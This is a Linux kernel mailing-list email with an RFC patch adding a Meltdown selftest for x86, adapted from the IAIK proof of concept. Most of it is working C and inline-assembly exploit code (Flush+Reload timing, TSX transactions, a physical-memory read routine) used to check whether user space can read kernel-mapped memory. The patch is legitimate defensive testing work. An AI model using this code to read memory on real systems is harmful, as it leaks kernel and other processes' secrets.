Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id E44E1628FCD
	for <lists+linux-kselftest@lfdr.de>; Tue, 15 Nov 2022 03:15:28 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S229806AbiKOCP1 (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Mon, 14 Nov 2022 21:15:27 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56872 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S231202AbiKOCP0 (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Mon, 14 Nov 2022 21:15:26 -0500
Received: from mga09.intel.com (mga09.intel.com [134.134.136.24])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D73226437;
        Mon, 14 Nov 2022 18:15:21 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1668478521; x=1700014521;
  h=date:from:to:cc:subject:message-id:mime-version;
  bh=wMopdXm4wV0x50+kXq7q88izyydsNlCV4yaEPL4WLo0=;
  b=edMmWRXdO7sx4sVKxDGdy1TRLqlXrGinlTmZeberlTJx1kVkjDPlpSfX
   NVJTtdHMRXN3iuVfHRDeaGLx8ERI8s1cYjGdFHlfR5ZrB7UC72hE0LHaE
   CwGjOziG+aQu7T1B4Q5XqYyTK7uHOtRUN3O//5Cs4n44Hxmbx8/p+oFCe
   3NRNhelZWZtSLge9HfnSPFjZKyLDFeTMQxq/LO7+uQsB9ksGDwWSTNwf8
   6lQIzWxlEGidSkAxgv3Hld985UztmnE9okrS+WCYWTYJZnWMZKAUA4XY/
   hX8kc9ucUknUGS40dhTSgOWB3UMJh01L3Y3lwxtd9ZRIFmFLuWanrbYBu
   Q==;
X-IronPort-AV: E=McAfee;i="6500,9779,10531"; a="313284232"
X-IronPort-AV: E=Sophos;i="5.96,164,1665471600"; 
   d="scan'208";a="313284232"
Received: from orsmga003.jf.intel.com ([10.7.209.27])
  by orsmga102.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 14 Nov 2022 18:15:21 -0800
X-ExtLoop1: 1
X-IronPort-AV: E=McAfee;i="6500,9779,10531"; a="589618271"
X-IronPort-AV: E=Sophos;i="5.96,164,1665471600"; 
   d="scan'208";a="589618271"
Received: from orsmsx603.amr.corp.intel.com ([10.22.229.16])
  by orsmga003.jf.intel.com with ESMTP; 14 Nov 2022 18:15:21 -0800
Received: from orsmsx610.amr.corp.intel.com (10.22.229.23) by
 ORSMSX603.amr.corp.intel.com (10.22.229.16) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31; Mon, 14 Nov 2022 18:15:20 -0800
Received: from ORSEDG602.ED.cps.intel.com (10.7.248.7) by
 orsmsx610.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31 via Frontend Transport; Mon, 14 Nov 2022 18:15:20 -0800
Received: from NAM12-MW2-obe.outbound.protection.outlook.com (104.47.66.44) by
 edgegateway.intel.com (134.134.137.103) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2375.31; Mon, 14 Nov 2022 18:15:19 -0800
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=C3mJv6H77hLcT4YeWoNAfQS+fHUed30rWnSgd3i48UygDyn3mQYgzgjGg92s3GSxCmqVvxdLx1zzsVYZDH00ViokZKgi54H4ytx20K061LMnoRWDwPx7URFZAyzf+rLU+RXfitYtCiM9QyV57M28rgvafw4myjlmkjKBXZnZgVizyPXZuNEHGgXLEzrKRdRL9+NekZ371Oyicbj0oJ26z5A+DrAfhboQgy9Gz9ETtAqo1quO7gysEtyh3v3O4/Nes84A8+0eCmwt3jtEomwC1Hy7RAGAHbQJkP6pjE31Ihxm4YGL7dgJLJpo/nousF2tRJwaBKKcZ8NHJ3Ynb3uE1g==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=8KFwGNhDqh51FaEP3kyaferSnNcza9ULvkRBeS7ppeY=;
 b=M+EKHdS4iVWSbwLLsKSfEH3lEyOiD2hNhwwrsZMYQlz+Z7X4Wtvy1z2wSPeXT8/5rAirXKgACECWSq24MakUndZRdvgUwwLkvMAArWpwlPZq0BIFmbJqgfbAfWww0leY/12zGSHc+wa2Fnmlnnu8m9wUViGGBDdVST9Mi+/LkgFnK8RVB/h/C8ZiSTIUDKi7IPzIOIiMoc5KAyzoamVAsvamKJ6yDJBe1iTdtu8wyxz39fjWusOj2ePZBL7v/JBtW+uxtOjRCCxhMTu47pad5TQxKToUJR2rbT63p+1Mz4KIv/yETU+NUe0BijjYV9WgflPuOyDnxW0qTgxp8SUV2Q==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
 dkim=pass header.d=intel.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=intel.com;
Received: from BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
 by CH0PR11MB5395.namprd11.prod.outlook.com (2603:10b6:610:ba::6) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5813.16; Tue, 15 Nov
 2022 02:15:12 +0000
Received: from BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e]) by BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e%6]) with mapi id 15.20.5813.017; Tue, 15 Nov 2022
 02:15:12 +0000
Date:   Tue, 15 Nov 2022 10:15:03 +0800
From:   Aaron Lu <aaron.lu@intel.com>
To:     Dave Hansen <dave.hansen@linux.intel.com>
CC:     Tony Luck <tony.luck@intel.com>,
        "Yin, Fengwei" <fengwei.yin@intel.com>,
        "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>,
        "Huang, Ying" <ying.huang@intel.com>,
        Greg KH <gregkh@linuxfoundation.org>,
        <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>
Subject: [RFC PATCH v3] selftest/x86/meltdown: Add a selftest for meltdown
Message-ID: <Y3L2Jx3Kx9q8Dv55@ziqianlu-desk1>
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: inline
X-ClientProxiedBy: SI1PR02CA0039.apcprd02.prod.outlook.com
 (2603:1096:4:1f6::9) To BYAPR11MB3062.namprd11.prod.outlook.com
 (2603:10b6:a03:92::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BYAPR11MB3062:EE_|CH0PR11MB5395:EE_
X-MS-Office365-Filtering-Correlation-Id: 8baba902-a866-4283-e3ea-08dac6af39e9
X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: sIIfv2pKok9tsg1kkpKtY8SfHCQ3gBcNdO5aI/8Qc1ItTxuRZZo+pQV2fezTEEroGZy22m9hplwUFnZRa0OMFslADSLbGfwqX/zCqxwKbZMdAAMntJctWH8B8ZDpR/VzrguQbwWd4/sCkdvW4wJGlf8PZMlwSGyiW3bqGdhU8lbvrphQce2TodW/Lc6LdbDjlhw+lHMUIjHHduUN5jpSuuLfcGgPp5P3vn326tRW3WzQbmXybVAFDNbBzfBjceJI8GhCzYzON76AW5sonA4+N0JuqlNhKrJxHdR833Bme/Stdk9k+mipxwNKpT6xB71iyW4XgLqQFKp8sW12HED97e6oG3Wy4EvtqwnTY9nb3Xafx2OHpy07OENHU7FfQ4f2Bdoe6C5jx5kXa5XkVyL0wP33igIyxWj/ktR76cnQitzZm6WlOu5b4NZSZ90dY/W/5uSirQAl9Wmyxhd/QRYXM2XKqi075G+b0tNGM8+aMAeiQOvTUyqSMGcZ1a0c6YKRXXE9nlFIV+EbkFDNZKlOCzGGxe1U/EJRYURMpLc2bH1AE6De12bIOnQkRPE7ZCO+stn9lbqHMwq+rCxIXlrTJ047CDNHTyz2Nt9VIdd++wDMyPCnDHnMsbRdvgxBL0RTVRFcoUfBSVdFd2pn2dtAOdtpz8uL+pYtqntbroT6ERiyvbf7n21zNXdwFmZqPLbnESmXLUmnHoxrE66RwYZNKdJGG2DeOGwwl1pFTlE1mKs=
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR11MB3062.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(7916004)(39860400002)(136003)(366004)(376002)(346002)(396003)(451199015)(33716001)(83380400001)(86362001)(38100700002)(82960400001)(478600001)(8936002)(4326008)(6486002)(6916009)(5660300002)(316002)(966005)(41300700001)(8676002)(66946007)(66476007)(66556008)(54906003)(186003)(2906002)(6512007)(9686003)(6666004)(44832011)(6506007)(30864003)(26005)(66899015);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?O1/YnEfehAOOABqjYk9RvO52F7tzIHeo9ltIgurA+FRVr1tsXndOS0VQlmlT?=
 =?us-ascii?Q?MyH2DYYL7VmN1T0PJgL8z4KHHrKnhzbZBrMvA5cLdgQQmzrYlVRpY9Afql2g?=
 =?us-ascii?Q?PqrUNcVxg0llvRkVGYqfWT0aLn8P7kMQ0yAqunR0MwlwNrqz7T5i0I+nLchm?=
 =?us-ascii?Q?kDkNHRDiciCb225t/aYptA5kOp0alUISdW4S8Oua/4PGGTmY2KeUujuvTFga?=
 =?us-ascii?Q?W4Za0LAftZIg8Xk2hZE+gpvYZYBxwaGjiOu2zLr2LTZVJdPS1k+BTMY5MTdu?=
 =?us-ascii?Q?Jg8ONFvEvBNmyFbRlRlGd4PI3VUmIvk/eDAJaTgGkW+ZfW+HSqv4m/T/4NG5?=
 =?us-ascii?Q?AmVLnsuiyRbdU9ItuRRP4JQLWWkx/JHJAME79o+Wds2XxWJBm7NacrHL+EB2?=
 =?us-ascii?Q?LKRxHrzs1q+pzwjSij176Nnf8Ly3zNXCyFI78G6tKzFDLTDg6JXb/4WmfZD0?=
 =?us-ascii?Q?vluyETYnn8OESZw2Rn6C8dcqVxqwg7a1a3Disne/n9srQTMbvIdv4JmyWVYC?=
 =?us-ascii?Q?GfiDqG1e11HWKPL1N0Q9lL227dEul1QaIh9nS6cikmEfzVgPFF7PquyBhe2w?=
 =?us-ascii?Q?LDIaSVS5IAW1zaFrF0fNb6j4zRSpw4bY7gCmLb20b18pH+9LLJeoG2m06/4w?=
 =?us-ascii?Q?N2ssURe+GY6JG1xthwMJmJK7WfNp20DYCtucUwa9B8AVOGEykFlCisR/CFzY?=
 =?us-ascii?Q?fiEZemQ6EdJpspPoGUv1BiQsMaViMPOpY06gutiWJuYIP14dQniCUzWEILew?=
 =?us-ascii?Q?+UtNNh4e5ggz1U+TcywYqHQqhY3rbvAoWSQhkhTTdmq10UjK66D/5UR55L2O?=
 =?us-ascii?Q?EGu1ZOHRV1GUfQbs8Oy3fp/U/OxzQvMfQnVqoo9fp4zwa1wLq8d2BNDdXSSC?=
 =?us-ascii?Q?/E1/U8ObTF61bQTDR/sIebAxEeB0sooUruug+jx2Uewf8xsAyG5/K4CFF81q?=
 =?us-ascii?Q?vmyPcxBalkvHYt8Y5tPsSa5rYwC6vBascn39sMKqilMAgsdwIgAw269Sl6UZ?=
 =?us-ascii?Q?pY+PgmBT7u5Y0a0ShAGXZloTHQHUl6hOjQDaXvxInf6ri0/cd5m2TH3zOsyO?=
 =?us-ascii?Q?GEhSkVnTzGWli9LEAHxxh20+UN4tSLq7kNWh+6roqRXOku2NGCq6fKmOpxJr?=
 =?us-ascii?Q?OlV2XIOXyCLnRS3VW/KUGZZNz6yyV8nSXaN4w51l98Qb2s+VKcCIQOyfKRcD?=
 =?us-ascii?Q?FJ5G3jz22jjQSO3MpQobUo4G+21mE2gba89QLw/I7TBHlGH1D8e/gFp0SC7u?=
 =?us-ascii?Q?3ET+cugqnrIsqplFh7IE/K4utWEOz2LG/dsAVxqnsyIRIF0UoYkhxGQhlmCz?=
 =?us-ascii?Q?SJfPmni9w37TSzQ+iiUuOqLx/RZkNy1z6bAaXM0PBEXZ2ImHb2nHOa0iOIcR?=
 =?us-ascii?Q?+dsWjrXVkO2WRIoQ7Dd7iWHGVJHGohkb/LAuSpBI/4rVpqEVa75y4MVzGX8k?=
 =?us-ascii?Q?GzHquZOPtgoL9yllGzwTgqiYcsy6yxJqOK0Wbkq/v3njLDYaGc0DauIaEqt7?=
 =?us-ascii?Q?DFyR85zyiaExAAa0367Mf7/a5mbQEn6/5l0C3cESJHtK/2wKqeUOpPUXcpF1?=
 =?us-ascii?Q?q5LBU7tziDIFmFgxNJm3Sm4+Ybr80cTK95AlpIHv?=
X-MS-Exchange-CrossTenant-Network-Message-Id: 8baba902-a866-4283-e3ea-08dac6af39e9
X-MS-Exchange-CrossTenant-AuthSource: BYAPR11MB3062.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 15 Nov 2022 02:15:12.2677
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: S09z2MyZ7TPphHaFTBtluRYhnL+vi66zVucjf7BqnrEZ2oXwQU1zcxCQS6fj4GkY7wD5lPhUaXiys2bMm8P9dQ==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH0PR11MB5395
X-OriginatorOrg: intel.com
X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,
        RCVD_IN_MSPIKE_H3,RCVD_IN_MSPIKE_WL,SPF_HELO_NONE,SPF_NONE
        autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

To capture potential programming errors like mistakenly setting Global
bit on kernel page table entries, a selftest for meltdown is added.

This selftest is based on https://github.com/IAIK/meltdown. What this
test does is to firstly set a predefined string at a random user address
and then with pagemap, get the physical address of this string. Finally,
try to fetch the data using kernel's directmap address for this physical
address to see if user space can use kernel's page table.

Per my tests, this test works well on CPUs that have TSX support. For
this reason, this selftest only works on CPUs that supports TSX.

This test requires the knowledge of direct map base. IAIK used the
following two methods to get direct map base:
1 through a kernel module to show phys_to_virt(0);
2 by exploiting the same HW vulnerability to guess the base.
Method 1 makes running this selftest complex while method 2 is not
reliable and I do not want to use a possibly wrong value to run this
test. Suggestions are welcome.

Tested on both x86_64 and i386_pae VMs on a host with i7-7700K cpu,
success rate is about 50% when nopti kernel cmdline is used.

As for legal stuff:

Add an Intel copyright notice because of a significant contribution to
this code. This also makes it clear who did the relicensing from Zlib
to GPLv2.

Also, just to be crystal clear, I have included my Signed-off-by on this
contribution because I certify that (from submitting-patches.rst):

   (b) The contribution is based upon previous work that, to the best
       of my knowledge, is covered under an appropriate open source
       license and I have the right under that license to submit that
       work with modifications, whether created in whole or in part
       by me, under the same open source license (unless I am
       permitted to submit under a different license), as indicated
       in the file; or

In this case, I have the right under the license to submit this work.
That license also permits me to relicense to GPLv2 and submit under the
new license.

I came to the conclusion that this work is OK to submit with all of the
steps I listed above (copyright notices, license terms and relicensing)
by strictly following all of the processes required by my employer.

This does not include a Signed-off-by from a corporate attorney.
Instead, I offer the next best thing: an ack from one of the maintainers
of this code who can also attest to this having followed all of the
proper processes of our employer.

[dhansen: advice on changelog of the legal part]
Signed-off-by: Aaron Lu <aaron.lu@intel.com>
Acked-by: Dave Hansen <dave.hansen@linux.intel.com> # Intel licensing process
---
v3: address legal related concerns raised from Greg KH by adding Intel
copyright in the header and explain in the changelog, no code change.

 tools/testing/selftests/x86/Makefile   |   2 +-
 tools/testing/selftests/x86/meltdown.c | 420 +++++++++++++++++++++++++
 2 files changed, 421 insertions(+), 1 deletion(-)
 create mode 100644 tools/testing/selftests/x86/meltdown.c

diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
index 0388c4d60af0..36f99c360a56 100644
--- a/tools/testing/selftests/x86/Makefile
+++ b/tools/testing/selftests/x86/Makefile
@@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
 TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
 			check_initial_reg_state sigreturn iopl ioperm \
 			test_vsyscall mov_ss_trap \
-			syscall_arg_fault fsgsbase_restore sigaltstack
+			syscall_arg_fault fsgsbase_restore sigaltstack meltdown
 TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
 			test_FCMOV test_FCOMI test_FISTTP \
 			vdso_restorer
diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
new file mode 100644
index 000000000000..0ad4b65adcd0
--- /dev/null
+++ b/tools/testing/selftests/x86/meltdown.c
@@ -0,0 +1,420 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * Copyright (c) 2022 Intel
+ *
+ * This selftest is based on code from https://github.com/IAIK/meltdown
+ * and can be used to check if user space can read data through kernel
+ * page table entries.
+ *
+ * Note for i386 test: due to kernel prefer to use high memory for user
+ * programs, it is necessary to restrict the available memory under that
+ * of low memory size(around ~896MiB) so that the memory hosting "string"
+ * in main() is directly mapped.
+ *
+ * Note for both x86_64 and i386 test: the hardware race window can not be
+ * exploited 100% each time so a single run of the test on a vulnerable system
+ * may not FAIL. My tests on a i7-7700K cpu have a success rate about 50%.
+ *
+ * The original copyright and license information are shown below:
+ *
+ * Copyright (c) 2018 meltdown
+ *
+ * This software is provided 'as-is', without any express or implied
+ * warranty. In no event will the authors be held liable for any damages
+ * arising from the use of this software.
+ *
+ * Permission is granted to anyone to use this software for any purpose,
+ * including commercial applications, and to alter it and redistribute it
+ * freely, subject to the following restrictions:
+ *
+ *    1. The origin of this software must not be misrepresented; you must not
+ *    claim that you wrote the original software. If you use this software
+ *    in a product, an acknowledgment in the product documentation would be
+ *    appreciated but is not required.
+ *
+ *    2. Altered source versions must be plainly marked as such, and must not be
+ *    misrepresented as being the original software.
+ *
+ *    3. This notice may not be removed or altered from any source
+ *    distribution.
+ */
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <cpuid.h>
+#include <errno.h>
+#include <err.h>
+#include <sys/mman.h>
+#include <sys/utsname.h>
+
+#define PAGE_SHIFT	12
+#define PAGE_SIZE	0x1000
+#define PUD_SHIFT	30
+#define PUD_SIZE	(1UL << PUD_SHIFT)
+#define PUD_MASK	(~(PUD_SIZE - 1))
+
+#define _XBEGIN_STARTED	(~0u)
+
+/* configurables */
+#define NR_MEASUREMENTS	3
+#define NR_TRIES	10000
+
+size_t cache_miss_threshold;
+unsigned long directmap_base;
+
+static int get_directmap_base(void)
+{
+	char *buf;
+	FILE *fp;
+	size_t n;
+	int ret;
+
+	fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+	if (!fp)
+		return -1;
+
+	buf = NULL;
+	ret = -1;
+	while (getline(&buf, &n, fp) != -1) {
+		if (!strstr(buf, "Kernel Mapping"))
+			continue;
+
+		if (getline(&buf, &n, fp) != -1 &&
+		    sscanf(buf, "0x%lx", &directmap_base) == 1) {
+			printf("[INFO]\tdirectmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+			directmap_base &= PUD_MASK;
+			ret = 0;
+			break;
+		}
+	}
+
+	fclose(fp);
+	free(buf);
+	return ret;
+}
+
+/*
+ * Requires root due to pagemap.
+ */
+static int virt_to_phys(unsigned long virt, unsigned long *phys)
+{
+	unsigned long pfn;
+	uint64_t val;
+	int fd, ret;
+
+	fd = open("/proc/self/pagemap", O_RDONLY);
+	if (fd == -1) {
+		printf("[INFO]\tFailed to open pagemap\n");
+		return -1;
+	}
+
+	ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+	if (ret == -1) {
+		printf("[INFO]\tFailed to read pagemap\n");
+		goto out;
+	}
+
+	if (!(val & (1ULL << 63))) {
+		printf("[INFO]\tPage not present according to pagemap\n");
+		ret = -1;
+		goto out;
+	}
+
+	pfn = val & ((1ULL << 55) - 1);
+	if (pfn == 0) {
+		printf("[INFO]\tNeed CAP_SYS_ADMIN to show pfn\n");
+		ret = -1;
+		goto out;
+	}
+
+	ret = 0;
+	*phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+
+out:
+	close(fd);
+	return ret;
+}
+
+static uint64_t rdtsc()
+{
+	uint64_t a = 0, d = 0;
+
+	asm volatile("mfence");
+#ifdef __x86_64__
+	asm volatile("rdtsc" : "=a"(a), "=d"(d));
+#else
+	asm volatile("rdtsc" : "=A"(a));
+#endif
+	a = (d << 32) | a;
+	asm volatile("mfence");
+
+	return a;
+}
+
+#ifdef __x86_64__
+static void maccess(void *p)
+{
+	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%rcx), %%rax\n"		\
+		     "shl $12, %%rax\n"			\
+		     "jz 1b\n"				\
+		     "movq (%%rbx,%%rax,1), %%rbx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "rax");
+#else
+static void maccess(void *p)
+{
+	asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%ecx), %%eax\n"		\
+		     "shl $12, %%eax\n"			\
+		     "jz 1b\n"				\
+		     "mov (%%ebx,%%eax,1), %%ebx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "eax");
+#endif
+
+static void detect_flush_reload_threshold()
+{
+	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+	size_t dummy[16];
+	size_t *ptr = dummy + 8;
+	uint64_t start = 0, end = 0;
+
+	maccess(ptr);
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		reload_time += (end - start);
+	}
+
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		flush(ptr);
+		flush_reload_time += (end - start);
+	}
+
+	reload_time /= count;
+	flush_reload_time /= count;
+
+	printf("[INFO]\tFlush+Reload: %zd cycles, Reload only: %zd cycles\n",
+			flush_reload_time, reload_time);
+	cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
+	printf("[INFO]\tFlush+Reload threshold: %zd cycles\n", cache_miss_threshold);
+}
+
+static int flush_reload(void *ptr)
+{
+	uint64_t start, end;
+
+	start = rdtsc();
+	maccess(ptr);
+	end = rdtsc();
+
+	flush(ptr);
+
+	if (end - start < cache_miss_threshold)
+		return 1;
+
+	return 0;
+}
+
+static int check_tsx()
+{
+	if (__get_cpuid_max(0, NULL) >= 7) {
+		unsigned a, b, c, d;
+		__cpuid_count(7, 0, a, b, c, d);
+		return (b & (1 << 11)) ? 1 : 0;
+	} else
+		return 0;
+}
+
+static unsigned int xbegin(void)
+{
+	unsigned int status;
+
+	asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
+	asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
+
+	return status;
+}
+
+static void xend(void)
+{
+	asm volatile("xend" ::: "memory");
+	asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+}
+
+static int __read_phys_memory_tsx(unsigned long phys, char *array)
+{
+	unsigned long virt;
+	int i, retries;
+
+	virt = phys + directmap_base;
+	for (retries = 0; retries < NR_TRIES; retries++) {
+		if (xbegin() == _XBEGIN_STARTED) {
+			MELTDOWN;
+			xend();
+		}
+
+		for (i = 1; i < 256; i++) {
+			if (flush_reload(array + i * PAGE_SIZE))
+				return i;
+		}
+	}
+
+	return 0;
+}
+
+/*
+ * Read physical memory by exploiting HW bugs.
+ * One byte a time.
+ */
+static int read_phys_memory(unsigned long phys, char *array)
+{
+	char res_stat[256];
+	int i, r, max_v, max_i;
+
+	memset(res_stat, 0, sizeof(res_stat));
+
+	for (i = 0; i < NR_MEASUREMENTS; i++) {
+		for (i = 0; i < 256; i++)
+			flush(array + i * PAGE_SIZE);
+
+		r = __read_phys_memory_tsx(phys, array);
+		if (r != 0)
+			res_stat[r]++;
+	}
+
+	max_v = 0;
+	for (i = 1; i < 256; i++) {
+		if (res_stat[i] > max_v) {
+			max_i = i;
+			max_v = res_stat[i];
+		}
+	}
+
+	if (max_v == 0)
+		return 0;
+
+	return max_i;
+}
+
+#ifdef __i386
+/* 32 bits version is only meant to run on a PAE kernel */
+static int arch_test_mismatch(void)
+{
+	struct utsname buf;
+
+	if (uname(&buf) == -1) {
+		printf("[SKIP]\tCan't decide architecture\n");
+		return 1;
+	}
+
+	if (!strncmp(buf.machine, "x86_64", 6)) {
+		printf("[SKIP]\tNo need to run 32bits test on 64bits host\n");
+		return 1;
+	}
+
+	return 0;
+}
+#else
+static int arch_test_mismatch(void)
+{
+	return 0;
+}
+#endif
+
+static int test_meltdown(void)
+{
+	char string[] = "test string";
+	char *array, *result;
+	unsigned long phys;
+	int i, len, ret;
+
+	if (arch_test_mismatch())
+		return 0;
+
+	if (get_directmap_base() == -1) {
+		printf("[SKIP]\tFailed to get directmap base. Make sure you are root and kernel has CONFIG_PTDUMP_DEBUGFS\n");
+		return 0;
+	}
+
+	detect_flush_reload_threshold();
+
+	if (!check_tsx()) {
+		printf("[SKIP]\tNo TSX support\n");
+		return 0;
+	}
+
+	if (virt_to_phys((unsigned long)string, &phys) == -1) {
+		printf("[FAIL]\tFailed to convert virtual address to physical address\n");
+		return -1;
+	}
+
+	len = strlen(string);
+	result = malloc(len + 1);
+	if (!result) {
+		printf("[FAIL]\tNot enough memory for malloc\n");
+		return -1;
+	}
+	memset(result, 0, len + 1);
+
+	array = mmap(NULL, 256 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (!array) {
+		printf("[FAIL]\tNot enough memory for mmap\n");
+		free(result);
+		return -1;
+	}
+	memset(array, 0, 256 * PAGE_SIZE);
+
+	for (i = 0; i < len; i++, phys++) {
+		result[i] = read_phys_memory(phys, array);
+		if (result[i] == 0)
+			break;
+	}
+
+	ret = !strncmp(string, result, len);
+	if (ret)
+		printf("[FAIL]\tSystem is vulnerable to meltdown.\n");
+	else
+		printf("[OK]\tSystem might not be vulnerable to meltdown.\n");
+
+	munmap(array, 256 * PAGE_SIZE);
+	free(result);
+
+	return ret;
+}
+
+int main(void)
+{
+	printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+
+	return test_meltdown();
+}
-- 
2.38.1

